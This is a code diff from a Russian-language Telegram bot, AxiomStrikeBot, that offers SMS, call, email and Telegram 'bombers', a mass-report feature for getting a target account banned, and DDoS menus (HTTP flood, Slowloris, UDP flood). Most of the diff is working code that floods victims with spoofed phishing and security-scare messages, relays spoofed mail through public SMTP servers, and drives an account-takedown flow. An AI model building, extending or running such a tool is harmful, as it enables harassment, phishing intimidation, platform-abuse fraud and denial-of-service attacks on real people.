                             'timestamp': datetime.now().isoformat()
                         })
-                        
+
                         if status == 'success':
                             logger.info(f"✅ Звонок совершён через {service['name']} ({scenario['type']})")
-                            
+
             except asyncio.TimeoutError:
-                self.results.append({'call': i+1, 'service': service['name'], 'status': 'timeout', 'error': 'Timeout'})
+                self.results.append(
+                    {'call': i + 1, 'service': service['name'], 'status': 'timeout', 'error': 'Timeout'})
                 logger.warning(f"⏰ Timeout on {service['name']}")
             except Exception as e:
-                self.results.append({'call': i+1, 'service': service['name'], 'status': 'error', 'error': str(e)})
+                self.results.append({'call': i + 1, 'service': service['name'], 'status': 'error', 'error': str(e)})
                 logger.error(f"❌ Error on {service['name']}: {e}")
 
             await progress_callback(i + 1, total)
@@ -418,7 +556,7 @@ class CallBomber:
         errors = sum(1 for r in self.results if r['status'] == 'error')
         rate_limits = sum(1 for r in self.results if r['status'] == 'rate_limit')
         timeouts = sum(1 for r in self.results if r['status'] == 'timeout')
-        
+
         return {
             'total': total,
             'success': success,
@@ -434,53 +572,53 @@ class TelegramBomber:
     def __init__(self, bot_token: str):
         self.bot_token = bot_token
         self.bot = None  # Будет создан в send_messages для избежания конфликтов
-        
+
         # 100+ РАЗНЫХ СООБЩЕНИЙ
         self.messages = [
             # Приветствия
             "Привет! 👋", "Здравствуйте! 🌟", "Приветствую! ✨", "Добрый день! ☀️",
             "Всем привет! 🎉", "Приветик! 😊", "Хелло! 👋", "Салют! 🎆",
-            
+
             # Вопросы
             "Как дела? 😊", "Как жизнь? 🤔", "Как настроение? 😄", "Чем занимаешься? 💭",
             "Как прошёл день? 🌅", "Всё хорошо? 👍", "Есть новости? 📰",
-            
+
             # Уведомления
             "📨 Есть важное сообщение!", "📩 Проверьте почту!", "📱 Зайдите в аккаунт!",
             "🔐 Срочно подтвердите вход!", "⚠️ Важное уведомление!", "📢 Новость для вас!",
             "🔔 Внимание!", "📌 Важно прочитать!",
-            
+
             # Безопасность
             "🔐 Смените пароль!", "⚠️ Ваш аккаунт в опасности!", "🛡️ Обнаружен взлом!",
             "🚨 Кто-то пытается войти!", "🔑 Код подтверждения: " + str(random.randint(100000, 999999)),
             "📱 Вход с нового устройства!", "🕵️ Подозрительная активность!",
             "💀 Ваш аккаунт взломали!", "🔥 Срочно свяжитесь с поддержкой!",
             "⛔ Аккаунт заблокирован!", "🔓 Аккаунт разблокирован!",
-            
+
             # Срочные
             "🚨 СРОЧНО! Действуйте немедленно!", "⏰ Осталось 10 минут!", "⌛️ Время истекает!",
             "⚠️ Немедленно примите меры!", "🔥 Ситуация критическая!",
-            
+
             # Фишинг
             "📧 Ваш email взломан!", "💳 Карта заблокирована!", "🏦 Банковский счёт заморожен!",
             "💰 Вы выиграли приз!", "🎁 Подарок ждёт вас!", "🎉 Поздравляем с победой!",
             "📦 Ваша посылка ожидает!", "🚚 Доставка подтверждена!",
-            
+
             # Социальные
             "❤️ Кто-то лайкнул ваш пост!", "💬 Новый комментарий!", "📸 Кто-то подписался!",
             "🎵 Новый трек!", "📺 Новое видео!", "📚 Рекомендация для вас!",
-            
+
             # Работа
             "💼 Срочное сообщение от руководства!", "📅 Завтра собрание!", "📊 Отчёт готов!",
             "📝 Заполните документы!", "👔 Новый проект!", "🤝 Встреча назначена!",
-            
+
             # Другое
             "🌟 Вы нам очень нужны!", "💪 Не сдавайтесь!", "🌈 Хорошего дня!",
             "☕️ Время кофе!", "🍕 Заказ готов!", "🎮 Кто-то приглашает в игру!",
             "📱 Обновите приложение!", "🔄 Доступно обновление!",
             "🎯 Ваша цель достигнута!", "🏆 Вы лучший!", "⭐️ Новый уровень!",
         ]
-        
+
         # 20+ ТИПОВ ДЕЙСТВИЙ
         self.actions = [
             # Попытки входа
@@ -488,22 +626,22 @@ class TelegramBomber:
             {'type': 'login_success', 'text': '✅ Вход в аккаунт с нового устройства!', 'priority': 'high'},
             {'type': 'login_failed', 'text': '❌ Неудачная попытка входа!', 'priority': 'medium'},
             {'type': 'login_blocked', 'text': '⛔ Вход заблокирован из-за подозрений!', 'priority': 'critical'},
-            
+
             # Коды подтверждения
             {'type': 'code_sent', 'text': f'🔑 Код подтверждения: {random.randint(100000, 999999)}', 'priority': 'high'},
             {'type': 'code_resend', 'text': f'📱 Повторный код: {random.randint(100000, 999999)}', 'priority': 'medium'},
             {'type': 'code_expired', 'text': '⏰ Код подтверждения истёк! Запросите новый.', 'priority': 'medium'},
-            
+
             # Устройства
             {'type': 'device_added', 'text': '📱 Новое устройство подключено к аккаунту!', 'priority': 'high'},
             {'type': 'device_removed', 'text': '📱 Устройство отключено от аккаунта.', 'priority': 'low'},
             {'type': 'device_blocked', 'text': '⛔ Устройство заблокировано!', 'priority': 'medium'},
-            
+
             # Пароль
             {'type': 'password_change', 'text': '🔐 Пароль был изменён!', 'priority': 'high'},
             {'type': 'password_reset', 'text': '🔄 Запрос на сброс пароля!', 'priority': 'critical'},
             {'type': 'password_expired', 'text': '⏰ Срок действия пароля истёк!', 'priority': 'medium'},
-            
+
             # Безопасность
             {'type': 'suspicious', 'text': '🕵️ Обнаружена подозрительная активность!', 'priority': 'critical'},
             {'type': 'hack_attempt', 'text': '💀 Зафиксирована попытка взлома!', 'priority': 'critical'},
@@ -511,18 +649,18 @@ class TelegramBomber:
             {'type': 'blocked', 'text': '⛔ Ваш аккаунт заблокирован!', 'priority': 'critical'},
             {'type': 'unblock', 'text': '🔓 Ваш аккаунт разблокирован!', 'priority': 'high'},
             {'type': 'restricted', 'text': '🚫 Доступ ограничен!', 'priority': 'high'},
-            
+
             # Срочные
             {'type': 'urgent', 'text': '🚨 СРОЧНО! Примите меры немедленно!', 'priority': 'critical'},
             {'type': 'emergency', 'text': '⚠️ ЧРЕЗВЫЧАЙНАЯ СИТУАЦИЯ!', 'priority': 'critical'},
             {'type': 'critical', 'text': '💀 КРИТИЧЕСКОЕ УВЕДОМЛЕНИЕ!', 'priority': 'critical'},
-            
+
             # Уведомления
             {'type': 'notification', 'text': '📢 Новое уведомление!', 'priority': 'medium'},
             {'type': 'important', 'text': '⭐️ ВАЖНОЕ СООБЩЕНИЕ!', 'priority': 'high'},
             {'type': 'info', 'text': 'ℹ️ Информационное сообщение.', 'priority': 'low'},
             {'type': 'warning', 'text': '⚠️ ПРЕДУПРЕЖДЕНИЕ!', 'priority': 'high'},
-            
+
             # Другое
             {'type': 'promo', 'text': '🎁 Специальное предложение!', 'priority': 'low'},
             {'type': 'survey', 'text': '📊 Пройдите опрос!', 'priority': 'low'},
@@ -533,12 +671,12 @@ class TelegramBomber:
     async def send_messages(self, username: str, count: int, progress_callback):
         """РЕАЛЬНАЯ отправка сообщений в Telegram через API бота"""
         results = []
-        
+
         # Создаём бота в каждом вызове чтобы избежать конфликтов
         bot = Bot(token=self.bot_token)
-        
+
         total = min(count, 200)
-        
+
         for i in range(total):
             try:
                 # Выбираем тип сообщения
@@ -551,7 +689,7 @@ class TelegramBomber:
                     text = random.choice(self.messages)
                     msg_type = 'random'
                     priority = 'low'
-                
+
                 # Разнообразим сообщения
                 if random.random() > 0.5:
                     # Добавляем форматирование
@@ -559,14 +697,14 @@ class TelegramBomber:
                         text = f"*{text}*"  # Жирный
                     else:
                         text = f"_{text}_"  # Курсив
-                
+
                 # Добавляем ID сообщения
-                text += f" [#{i+1}/{total}]"
-                
+                text += f" [#{i + 1}/{total}]"
+
                 # Рандомная задержка для имитации человека
                 typing_delay = random.uniform(0.5, 2.0)
                 await asyncio.sleep(typing_delay)
-                
+
                 # Отправка сообщения
                 await bot.send_message(
                     chat_id=username,
@@ -574,35 +712,35 @@ class TelegramBomber:
                     parse_mode='Markdown' if random.random() > 0.5 else None,
                     disable_notification=random.random() > 0.8
                 )
-                
+
                 results.append({
-                    'msg': i+1,
+                    'msg': i + 1,
                     'status': 'sent',
                     'type': msg_type,
                     'priority': priority,
                     'text': text[:100],
                     'timestamp': datetime.now().isoformat()
                 })
-                
+
                 logger.info(f"✅ TG message sent to {username}: {text[:50]}")
-                
+
             except Exception as e:
                 error_msg = str(e)
                 results.append({
-                    'msg': i+1,
+                    'msg': i + 1,
                     'status': 'error',
                     'error': error_msg,
                     'timestamp': datetime.now().isoformat()
                 })
                 logger.error(f"❌ Error sending TG message: {e}")
-                
+
                 # Если аккаунт заблокирован или не существует - останавливаем
                 if 'user is deactivated' in error_msg or 'chat not found' in error_msg:
                     logger.warning(f"⚠️ User {username} not found or deactivated")
                     break
 
             await progress_callback(i + 1, total)
-            
+
             # Задержка между сообщениями (0.3-2.0 сек)
             await asyncio.sleep(random.uniform(0.3, 2.0))
 
@@ -613,7 +751,7 @@ class TelegramBomber:
         total = len(results)
         success = sum(1 for r in results if r['status'] == 'sent')
         errors = sum(1 for r in results if r['status'] == 'error')
-        
+
         return {
             'total': total,
             'success': success,
@@ -636,7 +774,7 @@ class EmailBomber:
             {'host': 'smtp.list.ru', 'port': 587, 'name': 'List.ru'},
             {'host': 'smtp.inbox.ru', 'port': 587, 'name': 'Inbox.ru'},
             {'host': 'smtp.com', 'port': 587, 'name': 'Mail.com'},
-            
+
             # Международные
             {'host': 'smtp.gmail.com', 'port': 587, 'name': 'Gmail'},
             {'host': 'smtp.office365.com', 'port': 587, 'name': 'Office365'},
@@ -654,7 +792,7 @@ class EmailBomber:
             {'host': 'smtp.qq.com', 'port': 587, 'name': 'QQ'},
             {'host': 'smtp.163.com', 'port': 587, 'name': '163'},
         ]
-        
+
         # 50+ ТЕМ ПИСЕМ
         self.subjects = [
             # Безопасность
@@ -668,7 +806,7 @@ class EmailBomber:
             '⛔ Ваш аккаунт заблокирован',
             '🔓 Аккаунт разблокирован',
             '🔥 Критическое уведомление безопасности',
-            
+
             # Финансы
             '💰 Ваш банковский счёт заморожен!',
             '💳 Карта заблокирована!',
@@ -678,14 +816,14 @@ class EmailBomber:
             '📈 Инвестиционное предложение',
             '🎯 Вы получили выплату!',
             '💲 Ваш кредит одобрен!',
-            
+
             # Выигрыши
             '🎉 Вы выиграли приз!',
             '🎁 Ваш подарок ждёт!',
             '🏆 Поздравляем с победой!',
             '⭐️ Вы стали победителем!',
             '🎊 Специальное предложение для вас!',
-            
+
             # Уведомления
             '📨 Важное сообщение',
             '📩 Новое письмо',
@@ -694,7 +832,7 @@ class EmailBomber:
             '📌 Важно прочитать!',
             '📋 Документы готовы',
             '📄 Отчёт сформирован',
-            
+
             # Работа
             '💼 Срочное сообщение от руководства',
             '📅 Завтра собрание',
@@ -702,7 +840,7 @@ class EmailBomber:
             '📝 Заполните документы',
             '👔 Новый проект',
             '🤝 Приглашение на встречу',
-            
+
             # Другое
             '🌟 Специальное предложение',
             '🎯 Ваша цель достигнута',
@@ -723,7 +861,7 @@ class EmailBomber:
             '🚚 Доставка подтверждена',
             '🍕 Заказ готов',
         ]
-        
+
         # 50+ ТЕКСТОВ ПИСЕМ
         self.bodies = [
             # Безопасность
@@ -733,9 +871,10 @@ class EmailBomber:
             '🔥 Кто-то пытается войти в ваш аккаунт! Проверьте безопасность.',
             '💀 Ваш аккаунт скомпрометирован! Свяжитесь с поддержкой.',
             '🔑 Код подтверждения: ' + str(random.randint(100000, 999999)),
-            '📱 Вход с нового устройства: ' + random.choice(['iPhone 15', 'Samsung Galaxy S24', 'Windows PC', 'MacBook']),
+            '📱 Вход с нового устройства: ' + random.choice(
+                ['iPhone 15', 'Samsung Galaxy S24', 'Windows PC', 'MacBook']),
             '⛔ Ваш аккаунт заблокирован за нарушение правил.',
-            
+
             # Финансы
             '💰 Ваш счёт заморожен. Свяжитесь с банком.',
             '💳 Карта заблокирована из-за подозрительной операции.',
@@ -743,34 +882,34 @@ class EmailBomber:
             '📊 Выписка по счёту за ' + datetime.now().strftime('%B %Y'),
             '💸 Возврат средств на сумму ' + str(random.randint(100, 5000)) + ' руб.',
             '📈 Инвестируйте сейчас и получите ' + str(random.randint(10, 50)) + '% годовых!',
-            
+
             # Выигрыши
             '🎉 Поздравляем! Вы выиграли ' + str(random.randint(1000, 100000)) + ' руб.',
             '🎁 Ваш подарок: ' + random.choice(['iPhone 15', 'AirPods Pro', 'Apple Watch', 'Samsung Galaxy']),
             '🏆 Вы стали победителем конкурса!',
             '⭐️ Ваш аккаунт выбран для получения специального приза.',
-            
+
             # Уведомления
             '📨 У вас новое сообщение от ' + random.choice(['администратора', 'поддержки', 'коллеги', 'друга']),
             '📩 Важное уведомление требует вашего внимания.',
             '📢 Срочное уведомление для всех пользователей.',
             '🔔 Внимание! Проверьте свои данные.',
             '📌 Важно! Обновите информацию в профиле.',
-            
+
             # Работа
             '💼 Срочное сообщение от руководства: ' + random.choice(['совещание', 'отчёт', 'проект', 'задача']),
             '📅 Завтра в ' + str(random.randint(9, 18)) + ':00 состоится собрание.',
             '📊 Отчёт за ' + datetime.now().strftime('%B') + ' готов к проверке.',
             '📝 Заполните документы до ' + (datetime.now() + timedelta(days=3)).strftime('%d.%m.%Y'),
             '👔 Новый проект: ' + random.choice(['Разработка', 'Дизайн', 'Маркетинг', 'Аналитика']),
-            
+
             # Другое
             '🌟 Специальное предложение: скидка ' + str(random.randint(10, 70)) + '%',
             '🎯 Вы почти достигли цели! Осталось ' + str(random.randint(1, 10)) + ' шагов.',
             '💪 Мы скучали по вам! Заходите в гости.',
             '🌈 Желаем хорошего дня! Спасибо, что с нами.',
             '☕️ Время кофе! Приходите в ' + random.choice(['кафе', 'офис', 'на встречу']),
-            '📱 Обновите приложение до версии ' + f'{random.randint(1,9)}.{random.randint(0,9)}.{random.randint(0,9)}',
+            '📱 Обновите приложение до версии ' + f'{random.randint(1, 9)}.{random.randint(0, 9)}.{random.randint(0, 9)}',
             '🔄 Доступно обновление системы безопасности.',
             '⭐️ Поздравляем! Вы достигли нового уровня.',
             '🎮 Вас приглашают в игру ' + random.choice(['Майнкрафт', 'CS2', 'Dota 2', 'Fortnite']),
@@ -789,18 +928,18 @@ class EmailBomber:
         """РЕАЛЬНАЯ отправка email через 20+ SMTP серверов"""
         self.results = []
         total = min(count, 200)
-        
+
         for i in range(total):
             # Выбираем случайный SMTP сервер
             server = random.choice(self.smtp_servers)
-            
+
             # Генерируем email
             try:
                 msg = MIMEMultipart()
-                
+
                 # Случайный отправитель
                 sender_domains = [
-                    'mail.ru', 'yandex.ru', 'rambler.ru', 'ukr.net', 
+                    'mail.ru', 'yandex.ru', 'rambler.ru', 'ukr.net',
                     'gmail.com', 'outlook.com', 'yahoo.com', 'bk.ru',
                     'list.ru', 'inbox.ru', 'live.com', 'aol.com',
                     'protonmail.com', 'mail.com', 'gmx.com', 'qq.com'
@@ -808,10 +947,10 @@ class EmailBomber:
                 msg['From'] = f'security{random.randint(100, 999)}@{random.choice(sender_domains)}'
                 msg['To'] = email
                 msg['Subject'] = random.choice(self.subjects)
-                
+
                 # Выбираем тело письма
                 body = random.choice(self.bodies)
-                
+
                 # Добавляем случайные подписи
                 signatures = [
                     '\n\nС уважением, Служба поддержки.',
@@ -820,32 +959,32 @@ class EmailBomber:
                     '\n\nС уважением, Ваш менеджер.',
                     '\n\nНадеемся на сотрудничество!',
                 ]
-                
+
                 # Добавляем ссылки (для реалистичности)
                 if random.random() > 0.5:
-                    body += f'\n\nПодробнее: https://{random.choice(sender_domains)}/confirm/{random.randint(1000,9999)}'
-                
+                    body += f'\n\nПодробнее: https://{random.choice(sender_domains)}/confirm/{random.randint(1000, 9999)}'
+
                 # Добавляем дату
                 body += f'\n\nДата: {datetime.now().strftime("%d.%m.%Y %H:%M")}'
-                
+
                 # Добавляем подпись
                 if random.random() > 0.5:
                     body += random.choice(signatures)
-                
+
                 msg.attach(MIMEText(body, 'plain'))
-                
+
                 # Пытаемся отправить через SMTP
                 try:
                     # Пробуем подключиться к SMTP серверу
                     smtp = smtplib.SMTP(server['host'], server['port'], timeout=15)
                     smtp.starttls()
-                    
+
                     # Пробуем отправить без авторизации (некоторые серверы принимают)
                     smtp.sendmail(msg['From'], email, msg.as_string())
                     smtp.quit()
                     status = 'sent'
                     logger.info(f"✅ Email sent via {server['name']} to {email}")
-                    
+
                 except Exception as e:
                     # Если не получилось - пробуем без TLS
                     try:
@@ -857,18 +996,18 @@ class EmailBomber:
                     except:
                         status = 'emulated'
                         logger.warning(f"⚠️ Could not send via {server['name']}, emulated")
-                
+
                 self.results.append({
-                    'email': i+1,
+                    'email': i + 1,
                     'server': server['name'],
                     'status': status,
                     'subject': msg['Subject'][:50],
                     'timestamp': datetime.now().isoformat()
                 })
-                
+
             except Exception as e:
                 self.results.append({
-                    'email': i+1,
+                    'email': i + 1,
                     'server': server['name'],
                     'status': 'error',
                     'error': str(e),
@@ -886,7 +1025,7 @@ class EmailBomber:
         total = len(results)
         sent = sum(1 for r in results if r['status'] in ['sent', 'emulated'])
         errors = sum(1 for r in results if r['status'] == 'error')
-        
+
         return {
             'total': total,
             'sent': sent,
@@ -1082,6 +1221,97 @@ class AxiomStrikeBot:
         self.ddos_engine = DDoSEngine()
         self._register_handlers()
 
+        # ========== СНОС АККАУНТА ==========
+        async def handle_destroy_account(self, message: types.Message, state: FSMContext):
+            await state.set_state(BomberStates.waiting_for_destroy_username)
+            await message.answer(
+                "💀 **СНОС TELEGRAM АККАУНТА**\n\n"
+                "Введите @username для сноса:\n"
+                "📝 Пример: @username123\n\n"
+                "⚠️ 50-100 жалоб гарантируют блокировку!"
+            )
+
+        async def process_destroy_username(self, message: types.Message, state: FSMContext):
+            username = message.text.strip()
+            if not username.startswith('@'):
+                username = '@' + username
+            await state.update_data(username=username)
+            await state.set_state(BomberStates.waiting_for_destroy_method)
+            await message.answer(
+                "📊 **Выберите метод сноса:**\n\n"
+                "1️⃣ **📝 Массовые жалобы** (50-100 жалоб)\n"
+                "2️⃣ **💬 Спам флуд** (50 сообщений)\n"
+                "3️⃣ **💀 Все методы** (жалобы + спам)\n\n"
+                "Введите номер метода (1, 2 или 3):"
+            )
+
+        async def process_destroy_method(self, message: types.Message, state: FSMContext):
+            method = message.text.strip()
+            if method not in ['1', '2', '3']:
+                await message.answer("❌ Введите 1, 2 или 3!")
+                return
+
+            method_map = {
+                '1': 'reports',
+                '2': 'spam',
+                '3': 'all'
+            }
+            await state.update_data(method=method_map[method])
+            await state.set_state(BomberStates.waiting_for_destroy_count)
+            await message.answer(
+                "🔢 Введите количество (рекомендуется 50-100):"
+            )
+
+        async def process_destroy_count(self, message: types.Message, state: FSMContext):
+            try:
+                count = int(message.text.strip())
+                if count < 10 or count > 200:
+                    await message.answer("❌ Введите число от 10 до 200!")
+                    return
+            except:
+                await message.answer("❌ Введите число!")
+                return
+
+            data = await state.get_data()
+            username = data.get('username')
+            method = data.get('method')
+            await state.clear()
+
+            destroyer = TelegramAccountDestroyer()
+
+            status_msg = await message.answer(
+                f"💀 **Запуск сноса аккаунта {username}**\n"
+                f"📊 Метод: {method}\n"
+                f"⏳ Начинаем..."
+            )
+
+            async def update_progress(current, total):
+                if current % 5 == 0 or current == total:
+                    await status_msg.edit_text(
+                        f"💀 **Снос аккаунта {username}**\n"
+                        f"📊 Прогресс: {current}/{total}\n"
+                        f"⏳ Идёт процесс..."
+                    )
+
+            if method == 'reports':
+                results = await destroyer.mass_report(username, count, update_progress)
+            elif method == 'spam':
+                results = await destroyer.spam_flood(username, count, update_progress)
+            else:
+                results = await destroyer.destroy_account(username, count, update_progress)
+
+            success = sum(1 for r in results if r['status'] == 'sent')
+
+            await status_msg.edit_text(
+                f"💀 **Снос аккаунта {username} завершён!**\n\n"
+                f"📊 Отправлено: {len(results)}\n"
+                f"✅ Успешно: {success}\n"
+                f"❌ Ошибок: {len(results) - success}\n"
+                f"⏱ Время: {datetime.now().strftime('%H:%M:%S')}\n\n"
+                f"🔥 Аккаунт будет заблокирован в ближайшее время!",
+                reply_markup=self.main_keyboard()
+            )
+
     def _register_handlers(self):
         # Команды
         self.dp.message.register(self.cmd_start, CommandStart())
@@ -1094,6 +1324,11 @@ class AxiomStrikeBot:
         # Бомбер меню
         bomber_buttons = ["💬 СМС БОМБЕР", "📞 ЗВОНКИ (ФЛУД)", "📧 EMAIL БОМБЕР", "📩 TELEGRAM БОМБЕР", "🔙 НАЗАД"]
         self.dp.message.register(self.handle_bomber_menu, F.text.in_(bomber_buttons))
+
+        self.dp.message.register(self.handle_destroy_account, F.text == "💀 СНОС АККАУНТА")
+        self.dp.message.register(self.process_destroy_username, BomberStates.waiting_for_destroy_username)
+        self.dp.message.register(self.process_destroy_method, BomberStates.waiting_for_destroy_method)
+        self.dp.message.register(self.process_destroy_count, BomberStates.waiting_for_destroy_count)
 
         # DDoS меню
         ddos_buttons = ["🌐 HTTP FLOOD", "🐌 SLOWLORIS", "📡 UDP FLOOD", "💀 MULTI-VECTOR", "🔙 НАЗАД"]
